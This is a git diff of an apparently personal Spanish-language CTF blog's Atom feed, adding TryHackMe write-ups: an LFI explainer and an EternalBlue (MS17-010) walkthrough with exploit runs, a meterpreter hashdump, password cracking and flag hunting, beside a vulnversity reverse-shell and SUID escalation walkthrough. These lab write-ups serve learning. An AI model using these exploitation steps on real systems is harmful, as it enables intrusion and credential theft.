@@ -1,4 +1,17 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-11-12T08:43:10-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Pentester - Ctf’s</title><subtitle>Ingeniero de sistemas, autodidacta, entusidasta por la seguridad informatica.</subtitle><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><entry><title type="html">Walking An Application</title><link href="http://localhost:4000/Walking-An-Application/" rel="alternate" type="text/html" title="Walking An Application" /><published>2021-11-12T00:00:00-05:00</published><updated>2021-11-12T00:00:00-05:00</updated><id>http://localhost:4000/Walking-An-Application</id><content type="html" xml:base="http://localhost:4000/Walking-An-Application/"></content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><summary type="html"></summary></entry><entry><title type="html">tryhackme: blue</title><link href="http://localhost:4000/blue/" rel="alternate" type="text/html" title="tryhackme: blue" /><published>2021-11-11T00:00:00-05:00</published><updated>2021-11-11T00:00:00-05:00</updated><id>http://localhost:4000/blue</id><content type="html" xml:base="http://localhost:4000/blue/">&lt;h3 id=&quot;iniciamos-conprobando-que-la-maquina-este-encendida&quot;&gt;Iniciamos conprobando que la maquina este encendida&lt;/h3&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-11-15T13:52:45-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Pentester - Ctf’s</title><subtitle>Ingeniero de sistemas, autodidacta, entusidasta por la seguridad informatica.</subtitle><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><entry><title type="html">tryhackme: LFI</title><link href="http://localhost:4000/LFI/" rel="alternate" type="text/html" title="tryhackme: LFI" /><published>2021-11-15T00:00:00-05:00</published><updated>2021-11-15T00:00:00-05:00</updated><id>http://localhost:4000/LFI</id><content type="html" xml:base="http://localhost:4000/LFI/">&lt;h1 id=&quot;local-file-inclusion&quot;&gt;Local File Inclusion&lt;/h1&gt;
+
+&lt;p&gt;Esta técnica consiste en incluir ficheros locales, es decir, archivos que se encuentran en el mismo servidor de la web con 
+este tipo de fallo (a diferencia de Remote File Inclusión &lt;em&gt;RFI&lt;/em&gt; que incluye archivos alojados en otros servidores).&lt;/p&gt;
+
+&lt;p&gt;Esto se produce como consecuencia de un fallo en la programación de la página, filtrando inadecuadamente lo que se incluye al usar 
+funciones en PHP para incluir archivos.&lt;/p&gt;
+
+&lt;h2 id=&quot;qué-peligro-representa-esto-si-solo-se-incluyen-ficheros-que-estén-en-el-mismo-servidor&quot;&gt;¿Qué peligro representa esto si solo se incluyen ficheros que estén en el mismo servidor?&lt;/h2&gt;
+
+&lt;p&gt;En un escenario como este, un atacante podría modificar los parámetros de lo que se incluye, por ejemplo, podría indicarle al 
+sitio web que se incluyan otros archivos que también están en el servidor, comprometiendo la seguridad del mismo por completo.&lt;/p&gt;
+
+&lt;p&gt;Un ejemplo muy claro es el archivo de contraseñas como &lt;em&gt;/etc/passwd&lt;/em&gt; en sistemas Linux.&lt;/p&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="LFI" /><category term="Local File Inclusion" /><summary type="html">El mejor metodo de aprendizaje es practicando</summary></entry><entry><title type="html">tryhackme: blue</title><link href="http://localhost:4000/blue/" rel="alternate" type="text/html" title="tryhackme: blue" /><published>2021-11-11T00:00:00-05:00</published><updated>2021-11-11T00:00:00-05:00</updated><id>http://localhost:4000/blue</id><content type="html" xml:base="http://localhost:4000/blue/">&lt;h3 id=&quot;iniciamos-conprobando-que-la-maquina-este-encendida&quot;&gt;Iniciamos conprobando que la maquina este encendida&lt;/h3&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.31.159
 PING 10.10.31.159 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.31.159&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
@@ -40,8 +53,11 @@ Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span cl
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;blockquote&gt;
-  &lt;p&gt;How many ports are open with a port number under 1000?
-3&lt;/p&gt;
+  &lt;p&gt;How many ports are open with a port number under 1000?&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;3&lt;/p&gt;
 &lt;/blockquote&gt;
 
 &lt;p&gt;vemos el resultado del escaneo anterior con la utilidad &lt;em&gt;extractPors&lt;/em&gt; y esta nos copia los puertos en la clipboard&lt;/p&gt;
@@ -60,7 +76,120 @@ Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span cl
 
 &lt;blockquote&gt;
   &lt;p&gt;What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)&lt;/p&gt;
+&lt;/blockquote&gt;
 
+&lt;blockquote&gt;
+  &lt;p&gt;ms17-010&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;ahora ya sabemos que es vulnerable a &lt;em&gt;ethernalblue&lt;/em&gt;, buscamos un exploit manual en &lt;em&gt;google&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/blue/manual.png&quot; alt=&quot;exploit manual&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;procedemos a instalar la utilidad&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;comandos&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; pip &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; requirements.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;el &lt;em&gt;script&lt;/em&gt; tiene una utilidad que nos confirma que la maquina es vulnerable a &lt;em&gt;ethernalblue&lt;/em&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bas&quot;&gt;❯ python3 eternal_checker.py 10.10.125.134
+[*] Target OS: Windows 7 Professional 7601 Service Pack 1
+[!] The target is not patched
+=== Testing named pipes ===
+[*] Done
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Como vemos, la maquina no esta parchada contra esta vulnerabilidad, procedemos a explotarla
+nos novemos al directorio &lt;em&gt;shellcode&lt;/em&gt; como indicaa la “guia” del &lt;em&gt;scritp&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/blue/shell_code.png&quot; alt=&quot;configuracion scrit&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;ejecutamos con la configuración anterior&lt;/li&gt;
+  &lt;li&gt;toca ejecutar el comando varias veces puesto que, se bloquea la maquina y/o problemas de &lt;em&gt;eternalblue&lt;/em&gt; (algo común)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python eternalblue_exploit7.py 10.10.125.134 shellcode/sc_all.bin
+shellcode size: 2205
+numGroomConn: 13
+Target OS: Windows 7 Professional 7601 Service Pack 1
+SMB1 session setup allocate nonpaged pool success
+SMB1 session setup allocate nonpaged pool success
+good response status: INVALID_PARAMETER
+&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;en otra consola ponemos nuestra ejecutamos el comando &lt;em&gt;listener_prep.sh&lt;/em&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;hashdump&quot;&gt;hashdump&lt;/h1&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run post/windows/gather/hashdump
+
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; SESSION may not be compatible with this module:
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; missing Meterpreter features: stdapi_sys_process_set_term_size
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Obtaining the boot key...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Calculating the hboot key using SYSKEY 55bd17830e678f18a3110daf2c17d4c7...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Obtaining the user list and keys...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Decrypting user keys...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Dumping password hints...
+
+Jon:&lt;span class=&quot;s2&quot;&gt;&quot;Nah boi, I ain't sharing nutting with you&quot;&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Dumping password hashes...
+
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;ahora vamos a intentar crackear cada contraseña con el diccionario &lt;em&gt;rockyou.txt&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ john /home/blanco/Desktop/thm/blue/content/users.txt &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/blanco/Desktop/thm/rockyou.txt &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;NT
+
+alqfna22	&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;jon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;ahora a buscar la flag, para ello debemos regresar a la raiz del sistema y leer la primer bandera&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pwd
+&lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows
+meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ..
+meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pwd
+&lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;Listing: C:&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;============&lt;/span&gt;
+
+Mode              Size   Type  Last modified              Name
+&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;              &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;              &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+40777/rwxrwxrwx   0      &lt;span class=&quot;nb&quot;&gt;dir   &lt;/span&gt;2009-07-13 22:18:56 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;$Recycle&lt;/span&gt;.Bin
+40777/rwxrwxrwx   0      &lt;span class=&quot;nb&quot;&gt;dir   &lt;/span&gt;2009-07-14 00:08:56 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  Documents and Settings
+40777/rwxrwxrwx   0      &lt;span class=&quot;nb&quot;&gt;dir   &lt;/span&gt;2009-07-13 22:20:08 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  PerfLogs
+40555/r-xr-xr-x   4096   &lt;span class=&quot;nb&quot;&gt;dir   &lt;/span&gt;2009-07-13 22:20:08 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  Program Files
+40555/r-xr-xr-x   4096   &lt;span class=&quot;nb&quot;&gt;dir   &lt;/span&gt;2009-07-13 22:20:08 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  Program Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+40777/rwxrwxrwx   4096   &lt;span class=&quot;nb&quot;&gt;dir   &lt;/span&gt;2009-07-13 22:20:08 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  ProgramData
+40777/rwxrwxrwx   0      &lt;span class=&quot;nb&quot;&gt;dir   &lt;/span&gt;2018-12-12 22:13:22 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  Recovery
+40777/rwxrwxrwx   4096   &lt;span class=&quot;nb&quot;&gt;dir   &lt;/span&gt;2018-12-12 18:01:17 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  System Volume Information
+40555/r-xr-xr-x   4096   &lt;span class=&quot;nb&quot;&gt;dir   &lt;/span&gt;2009-07-13 22:20:08 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  Users
+40777/rwxrwxrwx   16384  &lt;span class=&quot;nb&quot;&gt;dir   &lt;/span&gt;2009-07-13 22:20:08 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  Windows
+100666/rw-rw-rw-  24     fil   2018-12-12 22:47:39 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  flag1.txt
+0000/---------    0      fif   1969-12-31 19:00:00 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  hiberfil.sys
+0000/---------    0      fif   1969-12-31 19:00:00 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;  pagefile.sys
+
+meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag1.txt
+xxxx&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;xxcxsx_txe_mxcxixx&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;para encontrar la 2da flag y no hacerlo manualmente usamos el comando&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;dir flag /s /p&lt;/p&gt;
 &lt;/blockquote&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="Ethernal blue - ms08-067" /><category term="Windows" /><summary type="html">El mejor metodo de aprendizaje es practicando</summary></entry><entry><title type="html">tryhackme: vulnversity</title><link href="http://localhost:4000/vulnversity/" rel="alternate" type="text/html" title="tryhackme: vulnversity" /><published>2021-11-10T00:00:00-05:00</published><updated>2021-11-10T00:00:00-05:00</updated><id>http://localhost:4000/vulnversity</id><content type="html" xml:base="http://localhost:4000/vulnversity/">&lt;h3 id=&quot;iniciamos-la-fase-de-reconocimiento&quot;&gt;Iniciamos la fase de reconocimiento&lt;/h3&gt;
 
 &lt;p&gt;Antes de iniciar, verificamos que la maquina este activa&lt;/p&gt;
@@ -93,7 +222,7 @@ rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1085.220/108
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;blockquote&gt;
-  &lt;p&gt;Scan the box, how many ports are open?
+  &lt;p&gt;Scan the box, how many ports are open?&lt;br /&gt;
 6&lt;/p&gt;
 &lt;/blockquote&gt;
 
@@ -110,7 +239,7 @@ rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1085.220/108
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;blockquote&gt;
-  &lt;p&gt;What version of the squid proxy is running on the machine?
+  &lt;p&gt;What version of the squid proxy is running on the machine?&lt;br /&gt;
 3128/tcp open  http-proxy  Squid http proxy 3.5.12&lt;/p&gt;
 &lt;/blockquote&gt;
 
@@ -163,22 +292,22 @@ Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span cl
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;(Vamos respondiendo las preguntas de la maquina)&lt;/p&gt;
 &lt;blockquote&gt;
-  &lt;p&gt;How many ports will nmap scan if the flag -p-400 was used?
+  &lt;p&gt;How many ports will nmap scan if the flag -p-400 was used?&lt;br /&gt;
 400&lt;/p&gt;
 &lt;/blockquote&gt;
 
 &lt;blockquote&gt;
-  &lt;p&gt;Using the nmap flag -n what will it not resolve?
+  &lt;p&gt;Using the nmap flag -n what will it not resolve?&lt;br /&gt;
 DNS&lt;/p&gt;
 &lt;/blockquote&gt;
 
 &lt;blockquote&gt;
-  &lt;p&gt;What is the most likely operating system this machine is running?
+  &lt;p&gt;What is the most likely operating system this machine is running?&lt;br /&gt;
 Ubuntu&lt;/p&gt;
 &lt;/blockquote&gt;
 
 &lt;blockquote&gt;
-  &lt;p&gt;What port is the web server running on?
+  &lt;p&gt;What port is the web server running on?&lt;br /&gt;
 3333&lt;/p&gt;
 &lt;/blockquote&gt;
 
@@ -187,8 +316,8 @@ Ubuntu&lt;/p&gt;
 &lt;p&gt;En esta fase utilizaremos Gobuster para ver posibles &lt;em&gt;urls&lt;/em&gt; existentes&lt;/p&gt;
 
 &lt;blockquote&gt;
-  &lt;p&gt;What is the directory that has an upload form page?
- /internal/&lt;/p&gt;
+  &lt;p&gt;What is the directory that has an upload form page?&lt;br /&gt;
+/internal/&lt;/p&gt;
 &lt;/blockquote&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.1.188:3333 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirb/common.txt &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; gobuster.txt
@@ -216,18 +345,18 @@ un archivo en la maquina, probaremos obtener una &lt;em&gt;shell&lt;/em&gt; medi
 
 &lt;p&gt;para ello, modificaremos &lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&quot;&gt;esta&lt;/a&gt; &lt;em&gt;shell&lt;/em&gt; de php&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;/assets/images/vulnversity/server.png&quot;&gt;cargar shell&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/vulnversity/server.png&quot; alt=&quot;cargar shell&quot; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;compromise-the-webserver&quot;&gt;Compromise the webserver&lt;/h3&gt;
 
 &lt;p&gt;En esta parte podemos hacerlo de varios metodos, pero seguiremos la maquina y utilizaremos &lt;em&gt;burp suite&lt;/em&gt;&lt;/p&gt;
 
 &lt;blockquote&gt;
-  &lt;p&gt;Run this attack, what extension is allowed?
+  &lt;p&gt;Run this attack, what extension is allowed?&lt;br /&gt;
 .phtml&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;p&gt;&lt;a href=&quot;/assets/images/vulnversity/shell.png&quot;&gt;shell en el servidor&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/vulnversity/shell.png&quot; alt=&quot;shell en el servidor&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;ponemos nuestra maquina en escucha&lt;/p&gt;
 
@@ -257,7 +386,7 @@ bill&lt;/p&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;blockquote&gt;
-  &lt;p&gt;What is the user flag?
+  &lt;p&gt;What is the user flag?&lt;br /&gt;
 8xdx99xxxfexaxadxxa6x36x1x0xcxcxxb&lt;/p&gt;
 &lt;/blockquote&gt;
 
@@ -296,7 +425,7 @@ tambien es valido utilizar &lt;em&gt;find / -perm -u=s -type f 2&amp;gt;/dev/nul
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;blockquote&gt;
-  &lt;p&gt;On the system, search for all SUID files. What file stands out?
+  &lt;p&gt;On the system, search for all SUID files. What file stands out?&lt;br /&gt;
 /bin/systemctl&lt;/p&gt;
 &lt;/blockquote&gt;
 
@@ -328,7 +457,7 @@ WantedBy=multi-user.target'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt
 x5xfxxxx9fxax27x36xd3xax9x6c7xd5
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
     &lt;blockquote&gt;
-      &lt;p&gt;Become root and get the last flag (/root/root.txt)
+      &lt;p&gt;Become root and get the last flag (/root/root.txt)&lt;br /&gt;
 x5xfx85x9x0x9x7x6xd33ax9x6cxfx5&lt;/p&gt;
     &lt;/blockquote&gt;
   &lt;/li&gt;
